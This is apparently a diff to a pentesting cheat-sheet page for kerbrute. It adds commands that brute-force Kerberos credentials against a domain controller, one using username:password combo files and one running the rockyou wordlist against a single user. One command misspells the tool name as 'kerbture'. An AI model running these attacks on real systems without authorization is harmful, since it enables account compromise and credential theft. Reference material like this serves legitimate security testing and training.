@@ -6,6 +6,27 @@ alts: [Impacket]
 website:
 ---
 
+## Bruteforce username:password
+
+```sh
+kerbrute bruteforce --dc 10.0.0.1 -d example.domain /path/to/combos.txt
+
+# combos.txt example:
+# username:password
+# admin:admin
+# wiener:peter
+```
+
+<br />
+
+## Bruteforce user's password
+
+```sh
+kerbture bruteuser --dc 10.0.0.1 -d example.domain /usr/share/wordlists/rockyou.txt username
+```
+
+<br />
+
 ## Enumerate users
 
 ```sh
